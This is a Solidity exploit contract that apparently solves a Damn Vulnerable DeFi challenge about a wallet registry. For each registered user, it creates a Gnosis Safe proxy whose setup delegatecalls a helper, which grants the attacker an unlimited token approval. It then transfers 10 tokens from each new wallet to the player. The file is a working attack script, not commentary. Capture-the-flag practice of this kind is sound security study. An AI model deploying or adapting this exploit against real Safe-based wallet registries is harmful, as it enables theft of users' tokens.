// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";
import "../DamnValuableToken.sol";

contract AttackBApprove {
  function kekApprove(address _addr, address token) external {
    IERC20(token).approve(_addr,type(uint256).max);
  }
}

contract AttackB {

  constructor (address factory, address masterCopy, address WR, address[] memory users, address DVT, address player) {  
    AttackBApprove ABA = new AttackBApprove();
    address to = address(ABA);
    bytes memory data = abi.encodeWithSelector(ABA.kekApprove.selector, address(this), DVT);
    address[] memory victims = new address[](1);

    for (uint256 i = 0; i < users.length;) {
      victims[0] = users[i];
      bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,victims,1,to,data,address(0),address(0),0,address(0));
      GnosisSafeProxy proxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(masterCopy,init,0,IProxyCreationCallback(WR));
      DamnValuableToken(DVT).transferFrom(address(proxy),player,10 ether);
      unchecked {++i;}
    }
  }
}
